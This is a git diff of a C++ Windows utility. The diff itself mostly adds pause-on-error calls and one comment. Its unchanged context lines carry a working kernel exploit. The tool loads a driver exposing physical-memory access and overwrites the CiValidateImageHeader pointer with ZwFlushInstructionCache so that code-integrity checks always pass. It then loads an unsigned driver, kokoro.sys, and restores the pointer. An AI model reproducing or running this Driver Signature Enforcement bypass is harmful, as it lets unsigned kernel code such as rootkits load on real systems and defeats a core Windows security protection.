@@ -13,6 +13,7 @@
 
 using namespace std;
 
+
 std::wstring GetCurrentAppFolder() {
     wchar_t buffer[1024];
     GetModuleFileNameW(NULL, buffer, 1024);
@@ -40,12 +41,14 @@ $$ |  $$ |\$$$$$$  |  \$$$$  |\$$$$$$  |$$ |      $$ |\$$$$$$  |\$$$$$$  |$$$$$$
     if (!status)
     {
         printf("Failed to load driver.");
+		system("pause");    
         return -1;
     }
 	status = OpenDriverDevice();
     if (!status)
     {
         printf("Failed to open device.");
+        system("pause");
         return -1;
     }
 	printf("[+] Driver loaded and device opened successfully.\n");
@@ -68,6 +71,7 @@ $$ |  $$ |\$$$$$$  |  \$$$$  |\$$$$$$  |$$ |      $$ |\$$$$$$  |\$$$$$$  |$$$$$$
         auto pdbPath = handler.GetPDB(binPath);
         if (pdbPath.empty()) {
             std::wcout << L"[-] Failed to get symbol for " << binPath << std::endl;
+            system("pause");
             return -1;
         }
 
@@ -82,6 +86,7 @@ $$ |  $$ |\$$$$$$  |  \$$$$  |\$$$$$$  |$$ |      $$ |\$$$$$$  |\$$$$$$  |$$$$$$
         auto offsets = handler.GetOffset(pdbPath, symbolsForThisFile);
         if (offsets.size() != symbolsForThisFile.size()) {
             std::wcout << L"[-] Failed to get offsets for " << binPath << std::endl;
+            system("pause");
             return -1;
         }
 
@@ -103,6 +108,8 @@ $$ |  $$ |\$$$$$$  |  \$$$$  |\$$$$$$  |$$ |      $$ |\$$$$$$  |\$$$$$$  |$$$$$$
     auto const mm = spf::memory_map::current();
     if (!mm) {
         printf("[-] Failed to create memory map: %d\n", static_cast<int>(mm.error()));
+        system("pause");
+		return -1;
     }
     else {
         // Any kernel virtual address.
@@ -113,12 +120,13 @@ $$ |  $$ |\$$$$$$  |  \$$$$  |\$$$$$$  |$$ |      $$ |\$$$$$$  |\$$$$$$  |$$$$$$
                 return std::make_pair(0ull, 0ul);
             return std::make_pair(base, size);
         }();
-        
+       
 		printf("[+] ntoskrnl.exe base: %p, size: 0x%X\n", (void*)ntoskrnl_base, ntoskrnl_size);
 
         if (!ntoskrnl_base || !ntoskrnl_size)
         {
             printf("Failed to get kernel base.");
+            system("pause");
             return -2;
         }
 
@@ -127,6 +135,7 @@ $$ |  $$ |\$$$$$$  |  \$$$$  |\$$$$$$  |$$ |      $$ |\$$$$$$  |\$$$$$$  |$$$$$$
         std::uint64_t const phys = mm->translate(virt);
         if (!phys) {
             printf("[-] Failed to translate virtual address: %p\n", virt);
+            system("pause");
             return -1;
         }
         else {
@@ -137,6 +146,7 @@ $$ |  $$ |\$$$$$$  |  \$$$$  |\$$$$$$  |$$ |      $$ |\$$$$$$  |\$$$$$$  |$$$$$$
 		std::uint64_t const zwphys = mm->translate(zwvirt);
         if (!zwphys) {
             printf("[-] Failed to translate virtual address: %p\n", zwvirt);
+            system("pause");
             return -1;
         }
         else {
@@ -148,6 +158,7 @@ $$ |  $$ |\$$$$$$  |  \$$$$  |\$$$$$$  |$$ |      $$ |\$$$$$$  |\$$$$$$  |$$$$$$
 		std::uint64_t const ciphys = mm->translate(civirt); 
         if (!ciphys) {
             printf("[-] Failed to translate virtual address: %p\n", civirt);
+            system("pause");
 			return -1;
         }
         else {
@@ -160,6 +171,7 @@ $$ |  $$ |\$$$$$$  |  \$$$$  |\$$$$$$  |$$ |      $$ |\$$$$$$  |\$$$$$$  |$$$$$$
 		if (!ReadPhysMemory(g_hDevice, ciphys, &cidata, sizeof(cidata))) {
 			printf("[-] Failed to read CiValidateImageHeader pointer from phys=0x%016llX\n",
 				static_cast<unsigned long long>(ciphys));
+            system("pause");
 			return -1;
 		}
 
@@ -168,10 +180,12 @@ $$ |  $$ |\$$$$$$  |  \$$$$  |\$$$$$$  |$$ |      $$ |\$$$$$$  |\$$$$$$  |$$$$$$
 		//we replace the ptr with the virtual addr of ZwFlushInstructionCache then it will return eternal true for any image header and bypass CI
 
 		WritePhysMemory(g_hDevice, ciphys, &zwvirt, sizeof(zwvirt));
+        //this is a simply driver that print helloworld,imlazyto push source you can check via ida yourself
 		status = DriverUtils::LoadDriver(GetCurrentAppFolder() + L"\\kokoro.sys", L"kokoro");
         if (!status)
         {
             printf("Failed to load driver error = %lu",GetLastError());
+			system("pause");
         }
 		WritePhysMemory(g_hDevice, ciphys, &cidata, sizeof(cidata)); // 恢复原值
 		DriverUtils::UnloadDriver(L"MyPortIO");
